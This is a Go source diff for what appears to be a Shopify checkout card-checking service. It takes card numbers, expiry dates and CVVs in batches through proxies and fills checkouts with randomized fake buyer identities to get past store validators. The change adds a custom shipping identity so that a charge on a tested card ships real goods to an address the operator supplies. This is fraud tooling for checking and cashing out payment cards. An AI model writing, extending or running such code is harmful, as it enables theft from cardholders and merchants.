@@ -81,6 +81,36 @@ type Address struct {
 	Address1, City, PostalCode, ZoneCode, CountryCode, Phone string
 }
 
+// CustomShip carries a user-supplied delivery identity (imsh gate).
+// When Addr1 != "" the engine ships to this address instead of the
+// addrbook rotation, so a charge produces a real parcel to the user.
+// Name/Email/Phone override buyer identity + contact fields.
+type CustomShip struct {
+	Name, Email, Phone string
+	Addr1, Addr2, City, State, Pin string
+}
+
+func (c CustomShip) valid() bool {
+	if c.Addr1 == "" || c.City == "" || c.State == "" || c.Pin == "" {
+		return false
+	}
+	if c.Phone != "" {
+		d := ""
+		for _, r := range c.Phone {
+			if r >= '0' && r <= '9' {
+				d += string(r)
+			}
+		}
+		if len(d) != 10 {
+			return false
+		}
+	}
+	if c.Email != "" && !strings.HasSuffix(strings.ToLower(c.Email), "@gmail.com") {
+		return false
+	}
+	return true
+}
+
 // dialCodes for E.164 phone normalization — strict stores reject local-format
 // numbers (DELIVERY_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN).
 var dialCodes = map[string]string{
@@ -2210,7 +2240,7 @@ func updateMetricsAndDead(msg, baseURL string) {
 	}
 }
 
-func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, proxyStr string) CheckoutResult {
+func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, proxyStr string, custom CustomShip) CheckoutResult {
 	cardStart := time.Now()
 	res := CheckoutResult{Currency: "USD", Proxy: "Not Used", Gateway: "UNKNOWN", CC: cc + "|" + mes + "|" + ano + "|" + cvv}
 
@@ -2316,6 +2346,29 @@ acquireVariant:
 	}
 	fName, lName := getRandName()
 	email := genEmail(fName, lName)
+	// imsh override: user-supplied Indian identity ships a real parcel.
+	// Both billing + delivery use it (coherent person, one address).
+	customIN := custom.valid()
+	if customIN {
+		if nm := strings.TrimSpace(custom.Name); nm != "" {
+			parts := strings.Fields(nm)
+			fName = parts[0]
+			if len(parts) > 1 {
+				lName = strings.Join(parts[1:], " ")
+			} else {
+				lName = parts[0]
+			}
+		}
+		if custom.Email != "" {
+			email = strings.TrimSpace(custom.Email)
+		}
+		shipAddr = Address{
+			Address1: custom.Addr1, City: custom.City,
+			PostalCode: custom.Pin, ZoneCode: custom.State,
+			CountryCode: "IN", Phone: "+91" + custom.Phone,
+		}
+		addr = shipAddr
+	}
 	phone := normalizePhone(addr.Phone, addr.CountryCode)
 	// Per-check randomized national number: static Book phones (55555555,
 	// 9876543210, …) trip repeated/sequential-digit validators. Keep the
@@ -2584,6 +2637,14 @@ acquireVariant:
 		"postalCode": shipAddr.PostalCode, "firstName": fName, "lastName": lName,
 		"zoneCode": shipAddr.ZoneCode, "phone": phoneE164,
 		"company": fName + " " + lName,
+	}
+	// imsh: user's real address2 (flat/landmark) rides on both streets.
+	if customIN && strings.TrimSpace(custom.Addr2) != "" {
+		a2 := strings.TrimSpace(custom.Addr2)
+		if sa, ok := billingAddr["streetAddress"].(map[string]string); ok {
+			sa["address2"] = a2
+		}
+		shipStreet["address2"] = a2
 	}
 
 	// Delivery terms: SHIPPING for physical goods, noDeliveryRequired for digital.
@@ -3420,7 +3481,11 @@ acquireVariant:
 			}
 			// Fresh digits every remedy: a bad draw (wrong leading digit
 			// for the country) must not poison all format attempts.
-			regenPhones()
+			// imsh: user's real number is sacred (delivery contact) —
+			// never randomize it, only cycle formats.
+			if !customIN {
+				regenPhones()
+			}
 			if strings.Contains(_c, "REQUIRED") {
 				if _phoneMode != "e164" {
 					applyPhone("e164")
@@ -3869,6 +3934,12 @@ func shopifyHandler(w http.ResponseWriter, r *http.Request) {
 	proxy := q.Get("proxy")
 	key := q.Get("key")
 	variant := q.Get("variant")
+	// imsh custom delivery identity (all optional; Addr1 present activates).
+	custom := CustomShip{
+		Name: q.Get("name"), Email: q.Get("email"), Phone: q.Get("phone"),
+		Addr1: q.Get("addr1"), Addr2: q.Get("addr2"), City: q.Get("city"),
+		State: q.Get("state"), Pin: q.Get("pin"),
+	}
 
 	w.Header().Set("Content-Type", "application/json")
 
@@ -3895,7 +3966,7 @@ func shopifyHandler(w http.ResponseWriter, r *http.Request) {
 	ctx, cancel := context.WithTimeout(r.Context(), CTX_TIMEOUT)
 	defer cancel()
 
-	res := processCard(ctx, parts[0], parts[1], parts[2], parts[3], site, variant, proxy)
+	res := processCard(ctx, parts[0], parts[1], parts[2], parts[3], site, variant, proxy, custom)
 	if res.Time == "" {
 		res.Time = fmt.Sprintf("%.2fs", time.Since(start).Seconds())
 	}
@@ -3921,6 +3992,14 @@ func batchHandler(w http.ResponseWriter, r *http.Request) {
 		Key     string   `json:"key"`
 		Proxies []string `json:"proxies"`
 		Proxy   string   `json:"proxy"`
+		Name    string   `json:"name"`
+		Email   string   `json:"email"`
+		Phone   string   `json:"phone"`
+		Addr1   string   `json:"addr1"`
+		Addr2   string   `json:"addr2"`
+		City    string   `json:"city"`
+		State   string   `json:"state"`
+		Pin     string   `json:"pin"`
 	}
 
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
@@ -3965,7 +4044,12 @@ func batchHandler(w http.ResponseWriter, r *http.Request) {
 			}
 
 			start := time.Now()
-			res := processCard(ctx, parts[0], parts[1], parts[2], parts[3], req.Site, req.Variant, proxy)
+			custom := CustomShip{
+				Name: req.Name, Email: req.Email, Phone: req.Phone,
+				Addr1: req.Addr1, Addr2: req.Addr2, City: req.City,
+				State: req.State, Pin: req.Pin,
+			}
+			res := processCard(ctx, parts[0], parts[1], parts[2], parts[3], req.Site, req.Variant, proxy, custom)
 			res.Time = fmt.Sprintf("%.2fs", time.Since(start).Seconds())
 			results[idx] = res
 
@@ -4151,7 +4235,7 @@ func metricsHandler(w http.ResponseWriter, r *http.Request) {
 
 // BUILD_VERSION bumps on every shipped change. Surfaced on / and
 // /status so operators verify a deploy took (receipt support etc).
-const BUILD_VERSION = "v29-flex-resubmit"
+const BUILD_VERSION = "v30-imsh-addr"
 const RECEIPT_SUPPORT = true
 
 func main() {
